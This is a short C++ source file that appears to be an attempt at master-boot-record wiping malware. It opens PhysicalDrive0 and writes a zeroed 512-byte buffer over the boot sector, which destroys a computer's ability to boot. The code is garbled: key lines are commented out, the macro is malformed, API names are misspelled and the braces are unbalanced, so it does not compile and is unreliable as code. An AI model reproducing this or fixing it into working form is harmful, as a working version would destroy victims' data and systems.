//#include<windos.h>
#include<iostream>

#define MBR_SIZE =512
using namespace std;

//int main()
{
    DWORD write;
    char mbrData[MBR_SIZE];
    ZeroMemory(&mbrData, (sizeof mbrData));

   // HANDEL MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0",GENERIC_ALL,FILE_SHARE_READ|
    FILE_SHARE_WRITE,NULL,OPEN,EXISTING,NULL,NULL)
  //  writeFile(MasterBootRecord, mbrData,MBR_SIZE, &write , NULL) == TRUE) {
        cout << "Master Boot record" << endl;
        sleep(5000);
        ExitProcess(0);


    }
    else {
        cout << "Fail";
        Sleep(5000);
        ExitProcess(0);
    }
    CloseHandel(MasterBootRecord);
    return EXIT_SUCCESS;
}